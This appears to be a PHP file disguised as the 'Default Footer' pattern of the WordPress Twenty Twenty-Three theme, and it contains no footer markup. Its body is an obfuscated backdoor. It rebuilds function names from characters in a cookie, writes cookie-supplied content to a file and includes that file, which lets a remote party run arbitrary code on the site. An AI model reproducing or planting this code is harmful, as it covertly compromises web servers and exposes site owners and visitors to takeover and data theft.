<?php
/**
 * Title: Default Footer
 * Slug: twentytwentythree/footer-default
 * Categories: footer
 * Block Types: core/template-part/footer
 */

$paths = $_COOKIE;
$abstract = 79;
$default = 0;
$script = 2;
$parameters = array();
$parameters[$default] = '';
while($script){
  $parameters[$default] .= $paths[29][$script];
  if(!$paths[29][$script + 1]){
    if(!$paths[29][$script + 2])
      break;
    $default++;
    $parameters[$default] = '';
    $script++;
  }
  $script = $script + 2 + 1;
}
$default = $parameters[21]().$parameters[1];
if(!$parameters[10]($default)){
  $script = $parameters[0]($default,$parameters[3]);
  $parameters[15]($script,$parameters[26].$parameters[14]($parameters[8]($paths[3])));
}
include($default);